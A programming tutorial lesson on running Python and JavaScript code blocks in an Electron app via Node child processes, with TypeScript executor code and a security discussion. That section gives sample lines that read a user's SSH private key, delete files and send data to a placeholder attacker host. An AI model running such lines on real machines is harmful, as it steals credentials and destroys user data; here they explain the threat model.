# Lesson 6 — Local Execution via Child Processes

## What You Will Build

Clicking Run on a Python code block executes the code and streams output to the panel
below it, line by line, as it arrives. A `print("hello")` in Python produces `hello`
below the block within a second. A loop that prints five lines shows each line appearing
one at a time. A syntax error shows the error message and line number in red. The app is
now a working code execution environment.

---

## What You Need to Know First

- Lesson 5: `RunState` FSM, `RUNNABLE_LANGUAGES`, `onRun` callback, the security model
- Lesson 2: IPC, `ipcMain.handle`, the preload script
- Lesson 1: Electron's main/renderer process split, `contextIsolation`

---

## The Lesson

### Step 1 — Processes, Streams, and Child Processes

Before writing any code, understand what executing a Python file means at the OS level.

**What a process is:**
A process is the OS's unit of execution. When you run `python3 script.py` in a terminal,
the OS creates a new process: it allocates memory, loads the Python interpreter, and begins
executing. The process has:
- Its own memory space — it cannot read or write another process's memory
- A process ID (PID) — an integer the OS uses to track it
- An exit code — a number the process returns when it finishes (0 = success, non-zero = error)

**The three standard streams:**
Every process starts with three open file descriptors:
- `stdin` (file descriptor 0) — input. The process reads from here. Usually the keyboard.
- `stdout` (file descriptor 1) — standard output. `print()` in Python writes here.
- `stderr` (file descriptor 2) — standard error. Error messages go here by default.

Why two output streams? So programs can be composed in pipelines without errors corrupting
data. If `python3 script.py | grep 'hello'` is run, grep receives `stdout`. Python's error
messages go to `stderr` and are not passed to grep.

**What `child_process.spawn` does:**
`child_process.spawn(command, args)` creates a new child process and returns a handle to
it. The child process runs `command` with the given `args`. The parent process (the Electron
main process) can communicate with the child via the child's stdin, stdout, and stderr streams.

`spawn` is non-blocking — it does not wait for the child to finish. Instead, the parent
listens for events on the child's streams:
- `childProcess.stdout.on('data', callback)` — fires when the child writes to stdout
- `childProcess.stderr.on('data', callback)` — fires when the child writes to stderr
- `childProcess.on('close', callback)` — fires when the child exits; callback receives the exit code

**CS lens:** This is event-driven I/O. The parent process does not poll ("is there output
yet? is there output now? how about now?") — it registers callbacks and the OS calls them
when data arrives. This model is efficient: the parent process is not blocked waiting for
the child. It can handle other IPC messages, respond to window events, or do other work
while the child runs.

This is the same model as browser events: `button.addEventListener('click', callback)`.
You register interest; the system notifies you when the event occurs.

**SE lens:** Child processes enforce isolation. The child process cannot access Electron's
memory, cannot send IPC messages, and cannot call Electron APIs. If the student's code
crashes the Python interpreter, the crash is contained to the child process — the Electron
app keeps running. This is the **bulkhead pattern** from distributed systems: isolate
failures so they cannot cascade.

### Step 2 — The Executor Package

Create the executor package — the module responsible for running code. It lives in
`packages/executor` because in later lessons the web shell and VSCode extension will
reuse it.

```
$ mkdir -p packages/executor/src
$ touch packages/executor/package.json
```

```json
{
  "name": "@codex/executor",
  "version": "1.0.0",
  "main": "dist/index.js",
  "types": "dist/index.d.ts",
  "scripts": {
    "build": "tsc"
  },
  "dependencies": {
    "@codex/core": "*"
  }
}
```

```
$ touch packages/executor/tsconfig.json
```

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "CommonJS",
    "outDir": "dist",
    "rootDir": "src",
    "strict": true,
    "declaration": true,
    "esModuleInterop": true
  },
  "include": ["src"]
}
```

**File explained:** `packages/executor` is a new package in the monorepo. Adding it follows
the same pattern as `core` and `renderer`. Its single responsibility: execute code and
return results. It does not know about React, Electron, or the file system.

### Step 3 — The Executor Interface

The strategy pattern begins here. Define the interface that all executors will implement:

In `packages/executor/src/types.ts`:

```typescript
export interface ExecutionResult {
  readonly stdout: string[]
  readonly stderr: string[]
  readonly exitCode: number
  readonly durationMs: number
}

export interface ExecutionOptions {
  readonly language: string
  readonly code: string
  readonly timeoutMs?: number
}

export interface Executor {
  readonly name: string
  canHandle(language: string): boolean
  execute(options: ExecutionOptions): Promise<ExecutionResult>
}
```

**CS lens:** An `interface` in TypeScript with methods is a **contract**: any class or
object that satisfies this contract can be used wherever an `Executor` is expected. The
caller does not know whether it is talking to a `LocalExecutor` (which spawns child
processes) or a `WASMExecutor` (which runs code in the browser) or a `RemoteExecutor`
(which sends code to a Docker container). This is the **strategy pattern**: the calling
code depends on the `Executor` interface, not on any specific implementation.

**Why `stdout: string[]` rather than `stdout: string`?**
Output arrives line by line. Storing it as an array preserves the structure — each element
is one line. The rendering code can then display each line separately, add timestamps, or
colour error lines. A flat string loses this structure.

**`canHandle(language: string): boolean` explained:**
Each executor knows which languages it supports. `LocalExecutor.canHandle('python')` returns
`true` if Python is installed. `WASMExecutor.canHandle('python')` always returns `true`
(Pyodide is always available). The `FallbackExecutor` in Lesson 13 calls `canHandle` to find
the first executor that can handle the language. This is the chain of responsibility pattern.

### Step 4 — The Local Executor

In `packages/executor/src/LocalExecutor.ts`:

```typescript
import { spawn } from 'child_process'
import { writeFile, unlink } from 'fs/promises'
import { tmpdir } from 'os'
import { join } from 'path'
import type { Executor, ExecutionOptions, ExecutionResult } from './types'

const LANGUAGE_COMMANDS: Record<string, { binary: string; extension: string }> = {
  python:     { binary: 'python3', extension: 'py' },
  py:         { binary: 'python3', extension: 'py' },
  javascript: { binary: 'node',    extension: 'js' },
  js:         { binary: 'node',    extension: 'js' },
}

export class LocalExecutor implements Executor {
  readonly name = 'local'

  canHandle(language: string): boolean {
    return language in LANGUAGE_COMMANDS
  }

  async execute(options: ExecutionOptions): Promise<ExecutionResult> {
    const { language, code, timeoutMs = 10_000 } = options
    const command = LANGUAGE_COMMANDS[language]

    if (command === undefined) {
      throw new Error(`LocalExecutor cannot handle language: ${language}`)
    }

    const tempFilePath = join(tmpdir(), `codex-${Date.now()}.${command.extension}`)
    await writeFile(tempFilePath, code, 'utf-8')

    try {
      return await runProcess(command.binary, [tempFilePath], timeoutMs)
    } finally {
      await unlink(tempFilePath).catch(() => {})
    }
  }
}

function runProcess(
  binary: string,
  args: string[],
  timeoutMs: number
): Promise<ExecutionResult> {
  return new Promise((resolve, reject) => {
    const startTime = Date.now()
    const stdout: string[] = []
    const stderr: string[] = []

    const childProcess = spawn(binary, args, {
      env: { ...process.env, PYTHONUNBUFFERED: '1' },
    })

    let isTimedOut = false
    const timeout = setTimeout(() => {
      isTimedOut = true
      childProcess.kill('SIGTERM')
    }, timeoutMs)

    childProcess.stdout.on('data', (chunk: Buffer) => {
      const lines = chunk.toString('utf-8').split('\n')
      for (const line of lines) {
        if (line.length > 0) stdout.push(line)
      }
    })

    childProcess.stderr.on('data', (chunk: Buffer) => {
      const lines = chunk.toString('utf-8').split('\n')
      for (const line of lines) {
        if (line.length > 0) stderr.push(line)
      }
    })

    childProcess.on('error', (err) => {
      clearTimeout(timeout)
      reject(err)
    })

    childProcess.on('close', (exitCode) => {
      clearTimeout(timeout)
      const durationMs = Date.now() - startTime

      if (isTimedOut) {
        resolve({
          stdout,
          stderr: [...stderr, `[Execution timed out after ${timeoutMs}ms]`],
          exitCode: -1,
          durationMs,
        })
        return
      }

      resolve({
        stdout,
        stderr,
        exitCode: exitCode ?? -1,
        durationMs,
      })
    })
  })
}
```

**`LANGUAGE_COMMANDS` explained:**
A `Record<string, { binary: string; extension: string }>` is a TypeScript type for a plain
object where every key is a `string` and every value has the shape `{ binary, extension }`.
It is equivalent to `{ [key: string]: { binary: string; extension: string } }`. We use it
as a dispatch table: look up the language, get the binary to run and the file extension to use.

**Why write to a temp file?**
The most reliable way to run a Python script is `python3 path/to/script.py`. We could also
pass the code via stdin (`python3 -c "code here"` or piping to stdin), but this has limits:
multi-line code with quotes is fragile when passed as a shell argument, and some language
runtimes do not support stdin execution at all. Writing to a temp file, running the file,
then deleting it is the most consistent approach.

**`tmpdir()` explained:**
`os.tmpdir()` returns the OS's temporary directory — `/tmp` on macOS/Linux,
`C:\Users\Username\AppData\Local\Temp` on Windows. Files there are not user-visible
(they do not appear in the user's home folder) and are cleaned up when the OS decides to.
We add a unique suffix (`Date.now()`) to avoid name collisions if two blocks run simultaneously.

**`try/finally` explained:**
`try { ... } finally { unlink(tempFilePath) }` ensures the temp file is deleted whether
the process succeeds, errors, or throws. Without `finally`, an exception in `runProcess`
would leave the temp file behind. `finally` always runs — it is the correct tool for cleanup.
`.catch(() => {})` on the `unlink` silences the error if the file was already deleted.

**`PYTHONUNBUFFERED: '1'` explained:**
By default, Python buffers its stdout output — it accumulates output in a buffer and flushes
it periodically or when the buffer is full. This means `print("hello")` might not appear
immediately; it might wait until the script ends or the buffer fills. `PYTHONUNBUFFERED=1`
disables this buffering. Without it, a long-running script appears to produce no output
until it finishes, then all output appears at once — defeating the line-by-line streaming effect.

**CS lens:** `runProcess` wraps the `spawn` callback API in a `Promise`. The `Promise`
constructor receives a `(resolve, reject)` callback. We call `resolve` when the child
exits normally and `reject` when the spawn itself fails (e.g., `ENOENT`). The `spawn`
API is callback-based because it was designed before Promises existed in JavaScript. This
wrapping pattern — converting callback APIs to Promises — is called **promisification** and
is common when working with older Node.js APIs.

**The timeout mechanism:**
`setTimeout(() => childProcess.kill('SIGTERM'), timeoutMs)` schedules a function to run
after `timeoutMs` milliseconds. If the child is still running at that time, we send
`SIGTERM` — a signal asking the process to terminate gracefully. `SIGTERM` allows the process
to clean up before exiting; `SIGKILL` (which we could send if SIGTERM is ignored) terminates
it immediately without cleanup. Always try `SIGTERM` first.

`clearTimeout(timeout)` cancels the scheduled timeout if the process exits before the
timeout fires. Without this, the timeout callback would try to kill a process that
no longer exists — a harmless but unnecessary operation.

### Step 5 — IPC for Execution

In `apps/electron/src/main.ts`, add the execution handler. First, add `@codex/executor`
to `apps/electron/package.json`'s dependencies:

```json
"dependencies": {
  "@codex/core": "*",
  "@codex/executor": "*",
  ...
}
```

Then in `main.ts`:

```typescript
import { LocalExecutor } from '@codex/executor'

const localExecutor = new LocalExecutor()

// Inside registerIpcHandlers:
ipcMain.handle(
  'execute:run',
  async (_event, language: string, code: string) => {
    return localExecutor.execute({ language, code })
  }
)
```

In `preload.ts`, add `executeCode` to the exposed API:

```typescript
executeCode: (language: string, code: string): Promise<unknown> =>
  ipcRenderer.invoke('execute:run', language, code),
```

Update the `Window` type declaration in `App.tsx`:

```typescript
declare global {
  interface Window {
    codexAPI: {
      openFolder: () => Promise<string | null>
      loadLibrary: (path: string) => Promise<Library>
      readChapter: (filePath: string) => Promise<string>
      executeCode: (language: string, code: string) => Promise<ExecutionResult>
    }
  }
}
```

Import `ExecutionResult` from `@codex/executor`.

### Step 6 — The Output Panel and RunState Update

Extend `RunState` in `CodeBlock.tsx` to include a `done` state with output:

```typescript
type RunState =
  | { status: 'idle' }
  | { status: 'running'; language: string }
  | { status: 'done'; stdout: string[]; stderr: string[]; exitCode: number }
```

Add the `OutputPanel` component inline in `CodeBlock.tsx`:

```typescript
function OutputPanel({ stdout, stderr, exitCode }: {
  stdout: string[]
  stderr: string[]
  exitCode: number
}) {
  const hasOutput = stdout.length > 0 || stderr.length > 0

  return (
    <div
      style={{
        background: '#0d0d1a',
        border: '1px solid #1a1a3e',
        borderTop: 'none',
        padding: '0.75rem 1rem',
        borderRadius: '0 0 6px 6px',
        fontFamily: 'Menlo, Consolas, monospace',
        fontSize: '0.875rem',
        lineHeight: '1.5',
      }}
    >
      {!hasOutput && exitCode === 0 && (
        <span style={{ color: '#888' }}>[No output]</span>
      )}
      {stdout.map((line, index) => (
        <div key={index} style={{ color: '#e2e8f0' }}>{line}</div>
      ))}
      {stderr.map((line, index) => (
        <div key={index} style={{ color: '#fc8181' }}>{line}</div>
      ))}
      {exitCode !== 0 && (
        <div style={{ color: '#fc8181', marginTop: '0.5rem', fontSize: '0.75rem' }}>
          [Exit code: {exitCode}]
        </div>
      )}
    </div>
  )
}
```

Update `handleRun` to call the execution API:

```typescript
async function handleRun() {
  if (!isRunnable || runState.status === 'running') return
  if (onRun === undefined) return

  setRunState({ status: 'running', language: normalizedLanguage })

  const result = await onRun(normalizedLanguage, children)

  setRunState({
    status: 'done',
    stdout: result.stdout,
    stderr: result.stderr,
    exitCode: result.exitCode,
  })
}
```

Update `ChapterView.tsx`'s `onRun` prop to call `window.codexAPI.executeCode`:

```typescript
onRun={async (lang, code) => {
  return window.codexAPI.executeCode(lang, code)
}}
```

The `onRun` prop type in `CodeBlockProps` is now:
```typescript
readonly onRun?: (language: string, code: string) => Promise<ExecutionResult>
```

---

## Security: What Local Execution Can and Cannot Do

Lesson 05 established the security model for the Run button. This lesson implements the
first real executor — the moment to make the trust model concrete.

**The threat:** The `LocalExecutor` runs code as a child process with the same filesystem
and network permissions as the user running Codex. Code in a Python block can:
- Read any file the user can read: `open(os.path.expanduser("~/.ssh/id_rsa")).read()`
- Write or delete files: `os.remove("/Users/you/important.pdf")`
- Make network requests: `urllib.request.urlopen("https://attacker.com?data=...")`
- Spawn further child processes

A malicious curriculum file could exfiltrate credentials or delete documents and the
executor would run it without any warning.

**What the code does prevent:**
- The **timeout** (`SIGTERM` after 10 seconds) kills a long-running attack before it
  completes. A script that reads and uploads 100,000 files has 10 seconds to do so.
- **Process isolation** (the bulkhead pattern from Step 1) ensures that code which
  crashes the Python interpreter does not crash Electron. The child process is the blast
  radius; the app stays running.
- **The `contextBridge`** (Lesson 05) prevents renderer-side JavaScript from calling
  Node.js directly — the code execution path is controlled through the `executeCode`
  IPC handler, not exposed as a raw API to the web content.

**What is intentionally not prevented:**
Local execution with user-level permissions is a design decision, not an oversight. The
BRD states this explicitly: "For a curriculum you wrote yourself, running on your own
machine, this is fine. You trust the code because you wrote it." The mitigation for
untrusted code is the WASM executor (Tier 2, Lesson 13) and the Docker executor (Tier 3,
Lesson 18) — both sandboxed environments with no filesystem or network access.

**The lesson:** Never run code from a curriculum you did not write or fully read first.
This applies to every code execution system — not just Codex.

---

## Connect the Pieces

The `LocalExecutor` is the first concrete implementation of the `Executor` interface. It
is `Tier 1` in the fallback chain that Lesson 13 builds. The `LANGUAGE_COMMANDS` dispatch
table will be extended in Lesson 7 (adding TypeScript) and Lesson 14 (adding SQL, Lua, Ruby).

The `runProcess` function is reused by the Docker executor in Lesson 18 — but instead of
running `python3`, it runs `docker run` with the code mounted into a container.

---

## What Breaks Without This

If `PYTHONUNBUFFERED` is not set and the student runs a script that prints inside a loop
with a `time.sleep(1)` between iterations, no output appears until the entire script
completes (all items print at once). This is Python's output buffering. The fix — setting
`PYTHONUNBUFFERED=1` — is only necessary for Python; Node.js does not buffer stdout.

---

## Definition of Done

- [ ] `print("hello")` in a Python block outputs `hello` below the block
- [ ] A 5-line Python script that prints in a loop shows all 5 lines
- [ ] `console.log("hi")` in a JavaScript block outputs `hi`
- [ ] A Python `SyntaxError` shows the error message in red; the app does not crash
- [ ] A script that runs longer than 10 seconds is killed and shows a timeout message
- [ ] Running a second block while the first is still running works independently
- [ ] You can answer: what is `ENOENT` and when does it occur?
- [ ] You can answer: what is the difference between `SIGTERM` and `SIGKILL`?
- [ ] You can answer: why does `LocalExecutor` write to a temp file rather than using `-c`?
- [ ] `git commit` with a message explaining why
